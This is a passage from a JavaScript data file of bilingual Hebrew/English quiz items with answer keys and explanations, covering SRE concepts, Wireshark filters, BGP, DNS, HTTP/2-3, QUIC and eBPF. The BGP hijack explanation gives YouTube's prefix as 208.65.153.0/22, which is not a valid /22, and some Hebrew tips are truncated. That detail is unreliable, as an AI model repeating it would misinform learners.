        "Secrets are written directly in encrypted YAML",
        "GitHub Actions is the name of a CLI tool that runs pipelines"
      ]
    },
    {
      q: "\u200Fמה Shift Left Testing ולמה זה חוסך כסף?",
      correct: "\u200Fהזזת testing שמאלה ב-pipeline\nבדיקות מוקדמות יותר ב-development lifecycle\nbug שמתגלה ב-design עולה פחות מ-bug ב-production",
      choices: [
        "\u200Fהזזת testing שמאלה ב-pipeline\nבדיקות מוקדמות יותר ב-development lifecycle\nbug שמתגלה ב-design עולה פחות מ-bug ב-production",
        "\u200Fכלי שמזיז test cases לסוף pipeline למהירות",
        "\u200Fמתודולוגיה שמחליפה QA engineers באוטומציה",
        "\u200Fבדיקות שנעשות על ה-left side של cluster"
      ],
      explanation: "‏‏ Rule of 10 (IBM)\n\nעיקרי:\n- bug ב-design = $1\n- ב-development = $10\n- ב־QA = $100\n\nטיפ:\nPre-commit hooks (Husky) מונעים commit של code שעובר lint/test",
      explanationEn: "Rule of 10 (IBM): bug at design = $1, development = $10, QA = $100, production = $1,000+.\n\nMain Points:\n- Shift Left: unit tests in IDE (pre-commit), SAST (static analysis) in PR, integration tests in CI, security scanning (Snyk, Trivy) in build\n- Approaches: TDD (Test Driven Development) = extreme shift left\n- DevSecOps = security shift left",
      qEn: "What is Shift Left Testing and why does it save money?",
      correctEn: "Moving testing left in the pipeline\nEarlier tests in the development lifecycle\nA bug found at design costs less than a bug in production",
      choicesEn: [
        "Moving testing left in the pipeline\nEarlier tests in the development lifecycle\nA bug found at design costs less than a bug in production",
        "A tool that moves test cases to the end of the pipeline for speed",
        "A methodology that replaces QA engineers with automation",
        "Tests done on the left side of the cluster"
      ]
    }
  ],

  206: [
    {
      q: "\u200Fמה SLO, SLA, ו־SLI — ומה ההבדל?",
      correct: "\u200FSLI = מדידה (latency, availability)\nSLO = יעד פנימי (99.9%)\nSLA = הסכם מול לקוח עם קנסות",
      choices: [
        "\u200FSLI = מדידה (latency, availability)\nSLO = יעד פנימי (99.9%)\nSLA = הסכם מול לקוח עם קנסות",
        "\u200Fכולם זהים — מונחים שונים לאותו דבר",
        "\u200FSLO ל-developers, SLA ל-operations, SLI ל-legal",
        "\u200FSLA חינמי, SLO בתשלום"
      ],
      explanation: "‏‏ SLI — Service Level Indicator\n\nעיקרי:\n- מה אתה מודד\n- latency_p99 = 120ms\n- availability = 99.94%\n\nטיפ:\nGoogle בפנים עובד ב־99.99% SLO",
      explanationEn: "SLI (Service Level Indicator): what you measure — latency_p99 = 120ms, availability = 99.94%.\n\nMain Points:\n- SLO (Service Level Objective): your target — latency_p99 < 200ms, availability > 99.9%\n- Error Budget: 0.1% downtime = 43.8 minutes per month\n- SLA (Service Level Agreement): contract with customer — after breaching SLA, credit/refund",
      qEn: "What are SLO, SLA, and SLI — and what is the difference?",
      correctEn: "SLI = measurement (latency, availability)\nSLO = internal target (99.9%)\nSLA = agreement with customer with penalties",
      choicesEn: [
        "SLI = measurement (latency, availability)\nSLO = internal target (99.9%)\nSLA = agreement with customer with penalties",
        "They are all the same — different terms for the same thing",
        "SLO for developers, SLA for operations, SLI for legal",
        "SLA is free, SLO is paid"
      ]
    },
    {
      q: "\u200Fמה Chaos Engineering ולמה Netflix המציאה אותו?",
      correct: "\u200Fהזרקת כשלים בכוונה ל-production\nלגילוי חולשות לפני שכשל אמיתי קורה",
      choices: [
        "\u200Fהזרקת כשלים בכוונה ל-production\nלגילוי חולשות לפני שכשל אמיתי קורה",
        "\u200Fבדיקת ביצועים תחת load קיצוני",
        "\u200Fpenetration testing לאפליקציות",
        "\u200FA/B testing ל-feature flags"
      ],
      explanation: "‏‏ הרקע\n\nעיקרי:\n- Netflix עברה ל-cloud ב־2008\n- AWS outage 2011 הפיל אותם\n- Chaos Monkey\n\nטיפ:\nchaos experiment מתוכנן",
      explanationEn: "Background: Netflix migrated to cloud in 2008.\n\nMain Points:\n- AWS outage in 2011 brought them down\n- Chaos Monkey: tool that randomly kills VMs in production\n- Simian Army: Chaos Gorilla (AZ failure), Latency Monkey (network delays)",
      qEn: "What is Chaos Engineering and why did Netflix create it?",
      correctEn: "Injecting failures on purpose into production\nto find weaknesses before a real failure happens",
      choicesEn: [
        "Injecting failures on purpose into production\nto find weaknesses before a real failure happens",
        "Performance testing under extreme load",
        "Penetration testing for applications",
        "A/B testing for feature flags"
      ]
    },
    {
      q: "\u200Fמה Postmortem blameless ולמה חשוב?",
      correct: "\u200Fניתוח incident ללא האשמת אנשים\nמחפש כשלי מערכת, לא שגיאות אנושיות\nכדי לשפר תהליכים",
      choices: [
        "\u200Fניתוח incident ללא האשמת אנשים\nמחפש כשלי מערכת, לא שגיאות אנושיות\nכדי לשפר תהליכים",
        "\u200Fדוח שמגן על חברה מתביעות משפטיות",
        "\u200Fניתוח ביצועים שבועי",
        "\u200Freview קוד אחרי deploy לפרודקשן"
      ],
      explanation: "‏‏ Blameless Culture\n\nעיקרי:\n- אנשים לא מקבלים עונש\n- → מוכנים לדווח על בעיות\n- → ארגון לומד\n\nטיפ:\nללא postmortem = אותה תקלה שוב",
      explanationEn: "Blameless Culture: people aren't punished, so they're willing to report issues, and the organization learns.\n\nMain Points:\n- Google SRE: 'If a human error caused the outage, the system design failed.' 5 Whys: Why did DB go down\n- disk full\n- log rotation broke",
      qEn: "What is a blameless Postmortem and why is it important?",
      correctEn: "Analyzing an incident without blaming people\nLooking for system failures, not human mistakes\nTo improve processes",
      choicesEn: [
        "Analyzing an incident without blaming people\nLooking for system failures, not human mistakes\nTo improve processes",
        "A report that protects the company from lawsuits",
        "Weekly performance review",
        "Code review after deploying to production"
      ]
    },
    {
      q: "\u200Fמה Error Budget ב־SRE ואיך משפיע על velocity של פיתוח?",
      correct: "\u200FError Budget = 100% - SLO target\nאם SLO = 99.9%, error budget = 0.1%\n(43.8 דקות/חודש)\nכשה-budget אוזל — מאטים deployments",
      choices: [
        "\u200FError Budget = 100% - SLO target\nאם SLO = 99.9%, error budget = 0.1%\n(43.8 דקות/חודש)\nכשה-budget אוזל — מאטים deployments",
        "\u200FError Budget = מספר ה-bugs המותרים ב-release",
        "\u200FError Budget = זמן שמהנדסים מקדישים ל-bug fixes",
        "\u200FError Budget תמיד 5% ללא קשר ל־SLO"
      ],
      explanation: "‏‏ SRE Philosophy\n\nעיקרי:\n- reliability vs feature velocity\n- Error budget = זמן downtime מותר לפי SLO\n- חישוב\n\nטיפ:\nDev רוצים ל-deploy מהר = אינטרס גם ב-reliability",
      explanationEn: "SRE Philosophy: reliability vs feature velocity.\n\nMain Points:\n- Error budget = allowed downtime per SLO\n- Calculation: SLO=99.9%: 43.8 min/month budget\n- Incident caused 20 min downtime = burned 46% of budget",
      qEn: "What is Error Budget in SRE and how does it affect development velocity?",
      correctEn: "Error Budget = 100% - SLO target\nIf SLO = 99.9%, error budget = 0.1%\n(43.8 minutes/month)\nWhen the budget runs out — slow down deployments",
      choicesEn: [
        "Error Budget = 100% - SLO target\nIf SLO = 99.9%, error budget = 0.1%\n(43.8 minutes/month)\nWhen the budget runs out — slow down deployments",
        "Error Budget = number of allowed bugs per release",
        "Error Budget = time engineers spend on bug fixes",
        "Error Budget is always 5% regardless of SLO"
      ]
    }
  ],

  // ===== Research Track (301-305) =====
  301: [
    {
      q: "מה ה־Wireshark filter לראות רק חבילות שנשלחו מחדש?",
      correct: "‏tcp.analysis.retransmission",
      choices: [
        "‏tcp.analysis.retransmission",
        "‏tcp.flags.rst == 1",
        "‏tcp.analysis.lost_segment",
        "‏tcp.retransmit == true"
      ],
      explanation: "‏tcp.analysis.retransmission מסנן חבילות שה־TCP stack זיהה כretransmissions.\n\nעיקרי:\n- tcp.analysis.fast_retransmission מסנן fast retransmits (אחרי 3 dup-ACKs)\n- tcp.analysis.duplicate_ack מציג ACKים כפולים שמסמנים אובדן",
      explanationEn: "tcp.analysis.retransmission filters packets that the TCP stack identified as retransmissions.\n\nMain Points:\n- tcp.analysis.fast_retransmission filters fast retransmits (after 3 dup-ACKs)\n- tcp.analysis.duplicate_ack shows duplicate ACKs that signal packet loss",
      qEn: "What is the Wireshark filter to see only retransmitted packets?",
      correctEn: "tcp.analysis.retransmission",
      choicesEn: [
        "tcp.analysis.retransmission",
        "tcp.flags.rst == 1",
        "tcp.analysis.lost_segment",
        "tcp.retransmit == true"
      ]
    },
    {
      q: "מה מצב TCP 'Zero Window' מעיד עליו?",
      correct: "ה-receiver buffer מלא — ה-application לא קורא נתונים מהר מספיק",
      choices: [
        "ה-receiver buffer מלא — ה-application לא קורא נתונים מהר מספיק",
        "חיבור TCP נסגר בכוח",
        "אובדן חבילות ברשת",
        "ה-sender לא שולח נתונים"
      ],
      explanation: "‏Zero Window הוא כשה-receiver מכריז שאין לו buffer פנוי (window size=0).\n\nעיקרי:\n- ה-sender חייב להפסיק לשלוח\n- בדרך כלל סימן שה-application לא קורא מ-socket מהר מספיק — בעיית CPU או כניסה לקוד",
      explanationEn: "Zero Window occurs when the receiver announces no available buffer (window size=0).\n\nMain Points:\n- The sender must stop sending\n- Usually indicates the application is not reading from the socket fast enough — a CPU issue or code blocking",
      qEn: "What does TCP Zero Window state indicate?",
      correctEn: "The receiver buffer is full — the application is not reading data fast enough",
      choicesEn: [
        "The receiver buffer is full — the application is not reading data fast enough",
        "TCP connection was forcefully closed",
        "Packet loss in the network",
        "The sender is not sending data"
      ]
    },
    {
      q: "מה Statistics → TCP Stream Graph מראה ב־Wireshark?",
      correct: "גרף Time-Sequence המציג CWND ו־RTT לאורך זמן — drops נראים כצניחות",
      choices: [
        "גרף Time-Sequence המציג CWND ו־RTT לאורך זמן — drops נראים כצניחות",
        "מפת רשת של כל ה-hosts",
        "היסטוגרמה של גדלי חבילות",
        "ממשק לסינון packets לפי port"
      ],
      explanation: "‏TCP Stream Graphs ב־Wireshark כוללים: Time-Sequence (CWND), Throughput, Round-trip Time, Window Scaling.\n\nעיקרי:\n- הגרף הכי שימושי לניפוי: Time-Sequence — כל retransmission מופיע כנקודה שנוחתת ב־Y נמוך יותר, ו־CWND צניחה",
      explanationEn: "TCP Stream Graphs in Wireshark include: Time-Sequence (CWND), Throughput, Round-trip Time, Window Scaling.\n\nMain Points:\n- The most useful for troubleshooting: Time-Sequence — every retransmission appears as a dot dropping to a lower Y value, and CWND drops",
      qEn: "What does Statistics > TCP Stream Graph show in Wireshark?",
      correctEn: "A Time-Sequence graph showing CWND and RTT over time — drops appear as dips",
      choicesEn: [
        "A Time-Sequence graph showing CWND and RTT over time — drops appear as dips",
        "A network map of all hosts",
        "A histogram of packet sizes",
        "An interface for filtering packets by port"
      ]
    },
        {
      q: "מה Wireshark display filter שמציג רק HTTP GET requests?",
      correct: "‏http.request.method == 'GET'",
      choices: [
        "‏http.request.method == 'GET'",
        "‏http.method = GET",
        "‏filter http GET",
        "‏tcp.payload contains 'GET'"
      ],
      explanation: "‏Wireshark display filters (≠ capture filters!): http.request.method == 'GET'.\n\nעיקרי:\n- Capture filter (BPF syntax): host 192.168.1.1 and port 80\n- שימושיים: ip.src == 10.0.0.1, tcp.port == 443, dns.qry.name contains 'google', tls.handshake.type == 1 (ClientHello), http.response.code >= 400\n- tcp.analysis.retransmission לבעיות רשת",
      explanationEn: "Wireshark display filters (not capture filters!): http.request.method == 'GET'.\n\nMain Points:\n- Capture filter (BPF syntax): host 192.168.1.1 and port 80\n- Useful filters: ip.src == 10.0.0.1, tcp.port == 443, dns.qry.name contains 'google', tls.handshake.type == 1 (ClientHello), http.response.code >= 400\n- tcp.analysis.retransmission for network issues",
      qEn: "What Wireshark display filter shows only HTTP GET requests?",
      correctEn: "http.request.method == 'GET'",
      choicesEn: [
        "http.request.method == 'GET'",
        "http.method = GET",
        "filter http GET",
        "tcp.payload contains 'GET'"
      ]
    },
        {
      q: "מה TLS handshake נראה ב־Wireshark ואיזה packet ראשון?",
      correct: "‏ClientHello הוא הpacket הראשון — מכיל TLS version, cipher suites, וSNI ‎(שם הדומיין)‎ — filter: tls.handshake.type == 1",
      choices: [
        "‏ClientHello הוא הpacket הראשון — מכיל TLS version, cipher suites, וSNI ‎(שם הדומיין)‎ — filter: tls.handshake.type == 1",
        "‏ServerHello ראשון — השרת מתחיל negotiation",
        "‏Certificate ראשון — השרת שולח תעודה לפני הכל",
        "‏TCP SYN הוא ה־TLS handshake הראשון"
      ],
      explanation: "‏TLS 1.3 Handshake ב־Wireshark: 1) TCP SYN/SYN-ACK/ACK (TCP layer).\n\nעיקרי:\n- 2) ClientHello (TLS record type 22, handshake type 1): TLS version, random, session ID, cipher suites, extensions (SNI, ALPN, supported_groups)\n- 3) ServerHello + {Encrypted Extensions + Certificate + CertificateVerify + Finished} (מוצפן!)\n- 4) Client {Finished}",
      explanationEn: "TLS 1.3 Handshake in Wireshark: 1) TCP SYN/SYN-ACK/ACK (TCP layer).\n\nMain Points:\n- 2) ClientHello (TLS record type 22, handshake type 1): TLS version, random, session ID, cipher suites, extensions (SNI, ALPN, supported_groups)\n- 3) ServerHello + encrypted extensions, certificate, verify, and finished\n- 4) Client finished",
      qEn: "What does a TLS handshake look like in Wireshark and which packet is first?",
      correctEn: "ClientHello is the first packet — contains TLS version, cipher suites, and SNI (domain name) — filter: tls.handshake.type == 1",
      choicesEn: [
        "ClientHello is the first packet — contains TLS version, cipher suites, and SNI (domain name) — filter: tls.handshake.type == 1",
        "ServerHello is first — the server starts negotiation",
        "Certificate is first — the server sends a certificate before anything",
        "TCP SYN is the TLS handshake first packet"
      ]
    }
  ],
  302: [
    {
      q: "מה ההבדל העיקרי בין iBGP ל-eBGP?",
      correct: "‏iBGP פועל בתוך AS אחד, eBGP פועל בין ASים שונים",
      choices: [
        "‏iBGP פועל בתוך AS אחד, eBGP פועל בין ASים שונים",
        "‏iBGP יותר מהיר מ-eBGP",
        "‏eBGP משמש לrouting פנימי בלבד",
        "‏iBGP דורש חיבור ישיר, eBGP לא"
      ],
      explanation: "‏iBGP = Internal BGP, בתוך אותו AS.\n\nעיקרי:\n- eBGP = External BGP, בין ASים שונים\n- ההבדלים הטכניים: TTL (iBGP=255, eBGP=1), next-hop behavior, ו-loop prevention rule (iBGP router לא מפרסם מסלול iBGP לiBGP אחר ← חייב full mesh או Route Reflectors)",
      explanationEn: "iBGP = Internal BGP, within the same AS.\n\nMain Points:\n- eBGP = External BGP, between different ASes\n- Technical differences: TTL (iBGP=255, eBGP=1), next-hop behavior, and loop prevention rule (iBGP router won't advertise an iBGP route to another iBGP peer — requires full mesh or Route Reflectors)",
      qEn: "What is the main difference between iBGP and eBGP?",
      correctEn: "iBGP works within one AS, eBGP works between different ASes",
      choicesEn: [
        "iBGP works within one AS, eBGP works between different ASes",
        "iBGP is faster than eBGP",
        "eBGP is used for internal routing only",
        "iBGP requires a direct connection, eBGP does not"
      ]
    },
    {
      q: "בבחירת מסלול BGP, איזה קריטריון בודקים ראשון?",
      correct: "‏Weight (Cisco) — ערך גבוה יותר מנצח",
      choices: [
        "‏Weight (Cisco) — ערך גבוה יותר מנצח",
        "‏AS Path Length — קצר יותר מנצח",
        "‏Local Preference — ערך גבוה יותר מנצח",
        "‏MED — ערך נמוך יותר מנצח"
      ],
      explanation: "‏סדר path selection ב־BGP: 1) Weight (Cisco), 2) Local Preference, 3) Locally originated, 4) AS Path Length (קצר יותר), 5) Origin, 6) MED (נמוך יותר), 7) eBGP > iBGP, 8) IGP metric.\n\nעיקרי:\n- ברוב הRFC implementations, Local Preference הוא הראשון (Weight הוא Cisco proprietary)",
      explanationEn: "BGP path selection order: 1) Weight (Cisco), 2) Local Preference, 3) Locally originated, 4) AS Path Length (shorter wins), 5) Origin, 6) MED (lower wins), 7) eBGP > iBGP, 8) IGP metric.\n\nMain Points:\n- In most RFC implementations, Local Preference is first (Weight is Cisco proprietary)",
      qEn: "In BGP path selection, which criterion is checked first?",
      correctEn: "Weight (Cisco) — higher value wins",
      choicesEn: [
        "Weight (Cisco) — higher value wins",
        "AS Path Length — shorter wins",
        "Local Preference — higher value wins",
        "MED — lower value wins"
      ]
    },
    {
      q: "מה גרמה תקרית Pakistan Telecom 2008 עם YouTube?",
      correct: "‏Pakistan פרסמה /24 ספציפי יותר מה-/22 של YouTube — BGP Longest Prefix Match ניצח",
      choices: [
        "‏Pakistan פרסמה /24 ספציפי יותר מה-/22 של YouTube — BGP Longest Prefix Match ניצח",
        "‏Pakistan פרצה לשרתי YouTube ישירות",
        "‏YouTube ביצעה BGP hijacking על Pakistan",
        "שגיאה ב־DNS הפנתה לservers שגויים"
      ],
      explanation: "‏BGP Longest Prefix Match: /24 תמיד מנצח /22 כי הוא ספציפי יותר.\n\nעיקרי:\n- Pakistan פרסמה 208.65.153.0/24 ←  route ספציפי יותר מ־208.65.153.0/22 של YouTube\n- ISPים בכל העולם העדיפו אותו\n- 75% מטראפיק YouTube הופנה ל־Pakistan תוך דקות",
      explanationEn: "BGP Longest Prefix Match: /24 always wins over /22 because it is more specific.\n\nMain Points:\n- Pakistan announced 208.65.153.0/24 — a more specific route than YouTube's 208.65.153.0/22\n- ISPs worldwide preferred it\n- 75% of YouTube traffic was redirected to Pakistan within minutes",
      qEn: "What caused the Pakistan Telecom 2008 incident with YouTube?",
      correctEn: "Pakistan announced a more specific /24 than YouTube's /22 — BGP Longest Prefix Match won",
      choicesEn: [
        "Pakistan announced a more specific /24 than YouTube's /22 — BGP Longest Prefix Match won",
        "Pakistan hacked YouTube servers directly",
        "YouTube performed BGP hijacking on Pakistan",
        "A DNS error pointed to wrong servers"
      ]
    },
        {
      q: "מה BGP AS Path ואיך הוא מונע routing loops?",
      correct: "‏AS Path = רשימת AS numbers שהmessage עבר — כל router שרואה את ה־ASN שלו ב־Path — דוחה את ה-route",
      choices: [
        "‏AS Path = רשימת AS numbers שהmessage עבר — כל router שרואה את ה־ASN שלו ב־Path — דוחה את ה-route",
        "‏AS Path הוא metric לבחירת route הטוב ביותר",
        "‏AS Path מגן מפני DDoS attacks על ה-routing",
        "‏AS Path מוצפן ב־BGPsec לאבטחה"
      ],
      explanation: "‏AS Path Loop Prevention: router מקבל UPDATE עם AS_PATH: [64501, 64502, 64503].\n\nעיקרי:\n- אם ה־ASN שלו (64501) מופיע בpath → DISCARD (loop!)\n- AS Path גם משמש כroute selection attribute (קצר יותר = מועדף ברירת מחדל)\n- AS Path Prepending: מוסיפים ASN שלנו מספר פעמים → נראה ארוך יותר → route פחות מועדף (traffic engineering)",
      explanationEn: "AS Path Loop Prevention: router receives UPDATE with AS_PATH: [64501, 64502, 64503].\n\nMain Points:\n- If its own ASN (64501) appears in the path, it discards the route (loop!)\n- AS Path also serves as a route selection attribute (shorter = preferred by default)\n- AS Path Prepending: adding your ASN multiple times makes the route appear longer and less preferred (traffic engineering)",
      qEn: "What is BGP AS Path and how does it prevent routing loops?",
      correctEn: "AS Path = list of AS numbers the message passed through — any router that sees its own ASN in the Path rejects the route",
      choicesEn: [
        "AS Path = list of AS numbers the message passed through — any router that sees its own ASN in the Path rejects the route",
        "AS Path is a metric for choosing the best route",
        "AS Path protects against DDoS attacks on routing",
        "AS Path is encrypted in BGPsec for security"
      ]
    }
  ],
  303: [
    {
      q: "מה ההבדל בין Recursive Resolver ל־Authoritative Nameserver?",
      correct: "‏Recursive Resolver עושה את כל חקירת השרשרת — Authoritative NS מחזיר את ה־IP האמיתי",
      choices: [
        "‏Recursive Resolver עושה את כל חקירת השרשרת — Authoritative NS מחזיר את ה־IP האמיתי",
        "‏Recursive Resolver הוא Root Server",
        "‏Authoritative NS מחזיר רק NXDOMAIN",
        "אין הבדל — שניהם אותה תפקיד"
      ],
      explanation: "‏Recursive Resolver (8.8.8.8, 1.1.1.1) שואל את Root → TLD → Auth בשביל הclient ומחזיר תוצאה מcache.\n\nעיקרי:\n- Authoritative NS (ns1.google.com) הוא המקור הסמכותי לdomain ספציפי — רק הוא יודע את ה־IP האמיתי",
      explanationEn: "Recursive Resolver (8.8.8.8, 1.1.1.1) queries Root, TLD, then Authoritative on behalf of the client and returns results from cache.\n\nMain Points:\n- Authoritative NS (ns1.google.com) is the authoritative source for a specific domain — only it knows the real IP",
      qEn: "What is the difference between Recursive Resolver and Authoritative Nameserver?",
      correctEn: "Recursive Resolver does all the chain queries — Authoritative NS returns the real IP",
      choicesEn: [
        "Recursive Resolver does all the chain queries — Authoritative NS returns the real IP",
        "Recursive Resolver is a Root Server",
        "Authoritative NS returns only NXDOMAIN",
        "No difference — both have the same role"
      ]
    },
    {
      q: "מה DNS-over-HTTPS (DoH) מספק שDNS רגיל לא?",
      correct: "הצפנה של DNS queries — ה־ISP רואה HTTPS ל-resolver ולא שאילתות DNS ספציפיות",
      choices: [
        "הצפנה של DNS queries — ה־ISP רואה HTTPS ל-resolver ולא שאילתות DNS ספציפיות",
        "‏DNS מהיר יותר",
        "תמיכה ב־IPv6",
        "אימות קריפטוגרפי של תשובות DNS"
      ],
      explanation: "‏DoH שולח DNS queries מוצפנות על HTTPS (port 443) — ה־ISP רואה HTTPS traffic לCloudflare/Google, לא את הdomains שאתה מבקר.\n\nעיקרי:\n- DNSSEC מספק אימות קריפטוגרפי (שאלה נפרדת)\n- DoT (port 853) הוא אלטרנטיבה — DNS over TLS",
      explanationEn: "DoH sends encrypted DNS queries over HTTPS (port 443) — the ISP sees HTTPS traffic to Cloudflare/Google, not which domains you are visiting.\n\nMain Points:\n- DNSSEC provides cryptographic authentication (separate concern)\n- DoT (port 853) is an alternative — DNS over TLS",
      qEn: "What does DNS-over-HTTPS (DoH) provide that regular DNS does not?",
      correctEn: "Encryption of DNS queries — the ISP sees HTTPS to the resolver and not specific DNS queries",
      choicesEn: [
        "Encryption of DNS queries — the ISP sees HTTPS to the resolver and not specific DNS queries",
        "Faster DNS",
        "IPv6 support",
        "Cryptographic authentication of DNS answers"
      ]
    },
    {
      q: "איך Anycast עובד עם 8.8.8.8 של Google?",
      correct: "‏Google מפרסמת 8.8.8.8 ממספר מקומות עם BGP — BGP מנתב לpoint הקרוב ביותר",
      choices: [
        "‏Google מפרסמת 8.8.8.8 ממספר מקומות עם BGP — BGP מנתב לpoint הקרוב ביותר",
        "8.8.8.8 הוא IP ייחודי לשרת ספציפי בארה\"ב",
        "‏DNS Round-Robin מחלק בין שרתים",
        "‏CDN מפנה requests לפי Geo-IP"
      ],
      explanation: "‏Anycast: אותה כתובת IP מפורסמת ממספר locations ב־BGP.\n\nעיקרי:\n- BGP always routes to the closest/best path\n- תוצאה: משתמש בישראל מגיע לdatacenter באירופה/ישראל, לא ב־US\n- 8.8.8.8 רץ מ-dozens of locations — RTT נמוך מכל מקום בעולם",
      explanationEn: "Anycast: the same IP address is advertised from multiple locations via BGP.\n\nMain Points:\n- BGP always routes to the closest/best path\n- Result: a user in Israel reaches a datacenter in Europe/Israel, not in the US\n- 8.8.8.8 runs from dozens of locations — low RTT from anywhere in the world",
      qEn: "How does Anycast work with Google's 8.8.8.8?",
      correctEn: "Google advertises 8.8.8.8 from multiple locations via BGP — BGP routes to the closest point",
      choicesEn: [
        "Google advertises 8.8.8.8 from multiple locations via BGP — BGP routes to the closest point",
        "8.8.8.8 is a unique IP for a specific server in the US",
        "DNS Round-Robin distributes between servers",
        "CDN redirects requests by Geo-IP"
      ]
    }
  ],
  304: [
    {
      q: "מה HOL Blocking שHTTP/2 עדיין סובל ממנו?",
      correct: "אובדן TCP packet אחד קופא את כל ה-streams בחיבור — TCP לא יודע על streams נפרדים",
      choices: [
        "אובדן TCP packet אחד קופא את כל ה-streams בחיבור — TCP לא יודע על streams נפרדים",
        "‏HTTP/2 לא תומך ב-multiplexing",
        "‏HTTP/2 מוגבל ל־6 בקשות במקביל",
        "ה-server לא יכול לשלוח data לפני שה-client ביקש"
      ],
      explanation: "‏HTTP/2 הביא multiplexing (מספר streams בחיבור אחד), אבל TCP מטפל בstream כbyte stream אחד רציף.\n\nעיקרי:\n- אובדן packet → TCP מחכה לretransmission → כל ה-streams קפואים\n- HTTP/3 על QUIC פותר זאת: כל stream עצמאי, אובדן ב-stream אחד לא חוסם אחרים",
      explanationEn: "HTTP/2 introduced multiplexing (multiple streams in one connection), but TCP treats the connection as a single sequential byte stream.\n\nMain Points:\n- Packet loss causes TCP to wait for retransmission, freezing all streams\n- HTTP/3 on QUIC solves this: each stream is independent, loss in one stream does not block others",
      qEn: "What is HOL Blocking that HTTP/2 still suffers from?",
      correctEn: "Losing one TCP packet freezes all streams in the connection — TCP does not know about separate streams",
      choicesEn: [
        "Losing one TCP packet freezes all streams in the connection — TCP does not know about separate streams",
        "HTTP/2 does not support multiplexing",
        "HTTP/2 is limited to 6 parallel requests",
        "The server cannot send data before the client requests it"
      ]
    },
    {
      q: "מה QUIC Connection Migration מספק?",
      correct: "מעבר בין WiFi לסלולרי ללא ניתוק — Connection ID שמר על הזהות, לא IP:port",
      choices: [
        "מעבר בין WiFi לסלולרי ללא ניתוק — Connection ID שמר על הזהות, לא IP:port",
        "חיבור מהיר יותר בהתחלה",
        "כפילות חיבורים לredundancy",
        "‏migration בין servers שונים"
      ],
      explanation: "‏TCP זוהה לפי tuple (src IP, src port, dst IP, dst port).\n\nעיקרי:\n- מעבר WiFi → סלולרי = IP חדש = חיבור נשבר\n- QUIC זוהה לפי Connection ID אקראי — ה-server ממשיך לדעת מי אתה גם אחרי שינוי IP\n- TLS 1.3 session resumption מאפשר המשך ללא re-handshake",
      explanationEn: "TCP is identified by tuple (src IP, src port, dst IP, dst port).\n\nMain Points:\n- WiFi to cellular transition = new IP = broken connection\n- QUIC is identified by a random Connection ID — the server continues to know who you are even after IP change\n- TLS 1.3 session resumption allows continuation without re-handshake",
      qEn: "What does QUIC Connection Migration provide?",
      correctEn: "Switching between WiFi and cellular without disconnecting — Connection ID keeps the identity, not IP:port",
      choicesEn: [
        "Switching between WiFi and cellular without disconnecting — Connection ID keeps the identity, not IP:port",
        "Faster connection at the start",
        "Duplicate connections for redundancy",
        "Migration between different servers"
      ]
    },
    {
      q: "מה יתרון 0-RTT ב־QUIC?",
      correct: "בחיבור חוזר, ה-client שולח data עם ה־ClientHello הראשון — אפס round trips",
      choices: [
        "בחיבור חוזר, ה-client שולח data עם ה־ClientHello הראשון — אפס round trips",
        "‏0-RTT = ללא latency בכלל",
        "‏QUIC תמיד מהיר יותר מTCP",
        "‏0-RTT עובד רק בתוך אותה network"
      ],
      explanation: "‏TCP + TLS = 1-3 RTT לפני data.\n\nעיקרי:\n- QUIC עם session resumption: client שומר session ticket מחיבור קודם, שולח data מיד עם ה-first packet (0-RTT)\n- מגבלה: 0-RTT data פגיע ל-replay attacks — לכן משתמשים בו רק לread-only requests",
      explanationEn: "TCP + TLS = 1-3 RTT before data.\n\nMain Points:\n- QUIC with session resumption: client saves session ticket from previous connection, sends data immediately with the first packet (0-RTT)\n- Limitation: 0-RTT data is vulnerable to replay attacks — therefore used only for read-only requests",
      qEn: "What is the advantage of 0-RTT in QUIC?",
      correctEn: "On a returning connection, the client sends data with the first ClientHello — zero round trips",
      choicesEn: [
        "On a returning connection, the client sends data with the first ClientHello — zero round trips",
        "0-RTT = no latency at all",
        "QUIC is always faster than TCP",
        "0-RTT works only within the same network"
      ]
    },
        {
      q: "מה HPACK ב־HTTP/2 ו־QPACK ב־HTTP/3 ולמה פותחו?",
      correct: "אלגוריתמי דחיסת headers — HTTP/1.1 שולח headers כtext חוזר בכל request ‎(כולל cookies גדולים)‎ — HPACK/QPACK מקודדים headers בindex table לחיסכון bandwidth",
      choices: [
        "אלגוריתמי דחיסת headers — HTTP/1.1 שולח headers כtext חוזר בכל request ‎(כולל cookies גדולים)‎ — HPACK/QPACK מקודדים headers בindex table לחיסכון bandwidth",
        "‏HPACK = encryption layer של HTTP/2",
        "‏QPACK = QUIC Packet compression",
        "שניהם מדחסים HTTP body, לא headers"
      ],
      explanation: "‏HTTP/1.1: כל request שולח User-Agent, Accept, Cookie מחדש — headers גדולים כ־1-2KB.\n\nעיקרי:\n- HPACK (RFC 7541): Static table (61 common headers), Dynamic table (headers שנראו ב-session)\n- 'GET /index.html' → index 2 (1 byte במקום 20 bytes!)\n- CRIME/BREACH attacks: ניצלו TLS+gzip compression לחשיפת secrets",
      explanationEn: "HTTP/1.1: every request resends User-Agent, Accept, Cookie — headers can be 1-2KB.\n\nMain Points:\n- HPACK (RFC 7541): Static table (61 common headers), Dynamic table (headers seen in session)\n- 'GET /index.html' becomes index 2 (1 byte instead of 20!)\n- CRIME/BREACH attacks exploited TLS+gzip compression to reveal secrets",
      qEn: "What are HPACK in HTTP/2 and QPACK in HTTP/3 and why were they developed?",
      correctEn: "Header compression algorithms — HTTP/1.1 sends headers as repeated text in every request (including large cookies) — HPACK/QPACK encode headers in an index table to save bandwidth",
      choicesEn: [
        "Header compression algorithms — HTTP/1.1 sends headers as repeated text in every request (including large cookies) — HPACK/QPACK encode headers in an index table to save bandwidth",
        "HPACK = encryption layer of HTTP/2",
        "QPACK = QUIC Packet compression",
        "Both compress HTTP body, not headers"
      ]
    }
  ],
  305: [
    {
      q: "מה eBPF Verifier מבטיח לפני שprogram רץ בkernel?",
      correct: "ה-program לא יגרום crash, לא ירוץ לנצח, ולא ייגש לזיכרון לא מורשה",
      choices: [
        "ה-program לא יגרום crash, לא ירוץ לנצח, ולא ייגש לזיכרון לא מורשה",
        "ה-program מהיר מאוד",
        "ה-program מוצפן",
        "ה-program תואם לכל גרסאות Linux"
      ],
      explanation: "‏eBPF Verifier בודק: 1) No unbounded loops — ה-program חייב לסיים, 2) No out-of-bounds memory access, 3) No uninitialized reads, 4) Return codes חוקיים.\n\nעיקרי:\n- רק אחרי verification מוצלח ה-kernel מריץ את ה-bytecode (JIT compiled)\n- זה ה-key feature שמאפשר run code in kernel safely",
